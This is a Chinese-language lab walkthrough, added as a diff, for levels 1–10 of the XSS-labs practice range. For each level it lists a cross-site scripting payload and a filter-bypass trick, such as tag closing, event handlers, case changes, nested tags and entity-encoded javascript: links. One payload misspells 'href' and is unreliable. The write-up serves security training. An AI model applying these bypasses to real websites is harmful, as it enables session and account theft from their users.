@@ -1,0 +1,41 @@
+实操-XSS-labs（1-10关）
+
+第一关
+
+没有任何限制，接收test改为<script>alert(1)</script>
+
+第二关
+
+闭合"和前面input标签的>,"><script>alert(1)</script>
+
+第三关
+
+这里是'闭合，' onclick='alert(1)  这里alert加'是为了成为完整的语句。
+
+第四关
+
+这里变成了"闭合  "onclick="alert(1)
+
+第五关
+
+这里对<script和on进行了转义，用"><a herf=javascript:alert(1)>1</a>，"闭合，>结束input
+
+第六关
+
+这里没有调用strtolower,用大写绕过"><SCRIPT>alert(1)</SCRIPT>
+
+第七关
+
+这里没有只过滤了一次，"><scrscriptipt>alert(1)</scrscriptipt>
+
+第八关
+
+采用html实体编码，javascrip&#x74;:alert(1)，利用html <a href属性自动解码
+
+第九关
+
+增加了一个http://链接代入，javascrip&#x74;:alert(1)//http://绕过
+
+第十关
+
+增加了一个接收值为t_sort，然后还是要闭合前面的"号，输入php?t_sort="<input type="text" onclick="alert(1)>绕过
